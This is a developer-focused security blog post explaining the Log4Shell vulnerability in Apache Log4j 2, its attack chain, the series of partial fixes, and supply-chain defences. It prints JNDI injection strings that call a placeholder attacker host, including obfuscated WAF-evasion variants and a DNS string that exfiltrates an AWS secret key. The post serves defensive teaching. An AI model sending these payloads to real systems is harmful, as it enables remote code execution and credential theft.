---
title: "Log4Shell: anatomy of an attack that broke half the internet"
date: 2026-10-23 09:00:00 +0200
categories: Security
related: [java, supply-chain, devops]
reading_time: 10
audience: dev
---

In the article on [PHP2Shell](/php2shell-shopify-security) I wrote that the vulnerability "isn't as trivial as Log4Shell". It's worth explaining why Log4Shell became the benchmark for every catastrophic RCE: not because of how sophisticated it was, but because of how **trivial it was to trigger** and how **impossible it was to inventory**.

In December 2021, all it took was writing a one-line string in the right place — often a field a user controls without even authenticating — to execute arbitrary code on servers that didn't even know they were using the vulnerable library.

### What Log4Shell is

Log4Shell is **CVE-2021-44228** (CVSS 10.0, the maximum) in **Apache Log4j 2**, the most widely used logging library in the Java ecosystem. It affects `log4j-core` from version **2.0-beta9** to **2.14.1**.[^nvd]

The key point: it isn't a vulnerability in one specific application, but in a **dependency** that lives inside thousands of products — from enterprise servers to games like Minecraft, from network appliances to cloud services. Many administrators were vulnerable without having the slightest idea they had Log4j in production, because it was a **transitive** dependency: pulled in by another library, a framework, or a closed-source product.

#### The root cause: JNDI inside message lookups

Log4j 2 supports **lookups**: placeholders in the `${...}` format that get expanded at runtime. They're used, for example, to insert environment variables (`${env:USER}`), system properties (`${sys:...}`) or the date into a log.

The problem is that:

1. lookup expansion was enabled by default **on the logged message content too**, not just on the formatting pattern;
2. among the available lookups there was `jndi`, which invokes the **Java Naming and Directory Interface**.

JNDI is a Java API for resolving "names" against remote directories: LDAP, RMI, DNS. And JNDI, in its historical configuration, was capable of **downloading and instantiating a Java class from a remote server** as the result of a lookup.

Putting the pieces together: if an attacker could get Log4j to log the string

```
${jndi:ldap://attacker.example/a}
```

the library interpreted it as a command, contacted the attacker's LDAP server and, following the response, loaded and executed a class of the attacker's choosing. **Remote code execution from a plain log line.**

#### How the attack was structured and organised

Unlike PHP2Shell — which needs memory grooming, precise offsets and worker affinity — here the chain was linear and reproducible. Here's how it was put together, phase by phase.

**1. Reconnaissance and canary spraying.** The attacker didn't know in advance which targets were vulnerable, nor where the log ended up. The technique was to flood every possible input with an "echo" payload, using a unique callback domain per target:

```
${jndi:dns://TARGET-ID.canary.attacker.example/x}
```

This string was dropped anywhere a value might end up in a log: HTTP headers (`User-Agent`, `X-Forwarded-For`, `Referer`), username fields, email subjects, filenames, in-game chat messages. When a resolution for `TARGET-ID.canary...` arrived at the attacker's own DNS server (or at tools like Burp Collaborator / interactsh), the attacker learned two things: that target was vulnerable, and *which* input was being logged. All of this **pre-authentication**, because anyone can write the headers of a request.

**2. Preparing the delivery infrastructure.** Once a target was confirmed, the attacker set up two servers:

- a **malicious LDAP/RMI server** (typically using the public `marshalsec` tool), which answered the JNDI request with a *referral*: "the class you're looking for is on this HTTP server";
- an **HTTP server** hosting the compiled class (`Exploit.class`) with the code to run in its static initialiser block or constructor.

**3. Trigger.** The "weaponised" payload was sent back to the target, this time pointing at the LDAP server:

```
${jndi:ldap://attacker.example:1389/Exploit}
```

When Log4j logged the string: it expanded the lookup → JNDI contacted the attacker's LDAP → received the referral to the HTTP server → downloaded `Exploit.class` → instantiated it → the code ran with the **privileges of the Java process** (often elevated). From there: reverse shell, C2, and on it went.

**4. WAF evasion.** As soon as the first signatures appeared, attackers exploited the fact that lookups are **nestable and composable** to obfuscate the string and bypass filters looking for the literal `jndi`:

```
${${lower:j}ndi:${lower:l}${lower:d}ap://...}
${${::-j}${::-n}${::-d}${::-i}:ldap://...}
```

To Log4j's parser these were equivalent to `jndi:ldap`; to a WAF looking for the exact string, they weren't.

**5. The "data exfiltration" variant without RCE.** Even where remote class loading was already blocked (see below), one valuable escape hatch remained: using lookups to **read a secret and ship it over DNS**.

```
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.attacker.example/x}
```

The value of the environment variable ended up in the subdomain of the DNS query, and the attacker read it off their own resolver. No shell, but credentials in the clear. This worked on far more targets than full RCE did.

**6. Mass post-exploitation.** In the following days, scanning was automated across the whole internet: botnets, coin miners (Kinsing, Mirai), ransomware and access brokers all used Log4Shell as an entry point. It wasn't a targeted attack, it was trawling.

#### Why the RCE worked (and the story of the "partial fixes")

The part of JNDI that downloads remote code was already considered risky: since JDK 8u191 the `com.sun.jndi.ldap.object.trustURLCodebase` option has been `false` by default, which blocks the simplest case (a referral to a remote `.class`).

But that wasn't enough, for two reasons:

- a great many servers ran on older or misconfigured JDKs;
- even with `trustURLCodebase=false`, the LDAP server could return a **serialised Java object** whose deserialisation triggered a **gadget chain** present in the application's classpath (the same chains used in Java deserialisation attacks). JNDI was the trigger, the gadgets already present were the bullet.

That's why the fix was a journey, not a single commit[^apache]:

- **2.15.0** — JNDI disabled by default and lookups restricted, but a bypass remained (**CVE-2021-45046**);
- **2.16.0** — message lookup handling removed entirely and JNDI disabled by default;
- **2.17.0** — closed a **CVE-2021-45105** (denial of service from recursive lookups);
- **2.17.1** — further JNDI hardening (**CVE-2021-44832**).

Anyone who applied the "first patch" and stopped there stayed exposed for weeks.

#### Fix and mitigations

- **Patch**: update `log4j-core` to at least **2.17.1** (or to the backported patch provided by the vendor of the product that bundles it).[^cisa]
- **If you couldn't update right away** (mitigations from the time): set `log4j2.formatMsgNoLookups=true`, or physically remove the `JndiLookup` class from the jar:
  `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`.
- Downstream: a WAF with up-to-date rules (aware of obfuscation), and blocking outbound LDAP/RMI connections from application servers to the internet.

### The point that matters: you can't patch what you don't know you have

This is the real lesson, and it's the opposite of the PHP2Shell one. With PHP, you know you have PHP. With Log4Shell, the number-one problem in the first 48 hours wasn't *applying* the patch: it was **finding out where Log4j was**.

- It was inside closed commercial products, where you can't touch the dependencies and have to wait for the vendor's patch.
- It was a transitive dependency: it didn't show up in your `pom.xml`, it was pulled in by another library.
- It came in non-obvious forms: a `.jar` inside a `.war` inside a container, a renamed jar, a shaded and repackaged copy (uber-jar) in which the string `log4j-core` didn't even appear.

The real defence wasn't a smarter WAF rule, but knowing **what runs in production**:

- an up-to-date **SBOM** (Software Bill of Materials), to answer "are we exposed?" in minutes, not days;
- **dependency scanning** in the CI pipeline (OWASP Dependency-Check, Trivy, Grype, Dependabot) that fails the build on a known critical CVE;
- an **asset inventory**, because the forgotten server is the one that gets you compromised;
- blocking outbound traffic by default from application servers: an app that should never open LDAP connections to the internet shouldn't be able to, and that one rule would have neutralised the attack's entire phase 3.

### In short

- **Log4Shell** (CVE-2021-44228, CVSS 10.0) is a pre-auth RCE in Log4j 2: a `${jndi:ldap://...}` string landing in a log was enough to execute remote code.
- The chain was **linear and reproducible** (canary → malicious LDAP → class/gadget → RCE), which is exactly why it lent itself to automated mass scanning.
- Obfuscation via nested lookups made the first WAF signatures useless; the DNS variant exfiltrated secrets even without RCE.
- The fix was a **journey** (2.15 → 2.16 → 2.17 → 2.17.1), not a single commit: stopping at the first patch left you exposed.
- The decisive defence wasn't technical, at the payload level, but managerial, at the supply-chain level: SBOM, dependency scanning and inventory. You can't patch what you don't know you have.

[^nvd]: NIST NVD, [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).
[^apache]: Apache Logging Services, [Log4j — Security](https://logging.apache.org/log4j/2.x/security.html): list of CVEs and the versions that fix them.
[^cisa]: CISA, [Apache Log4j Vulnerability Guidance](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance).
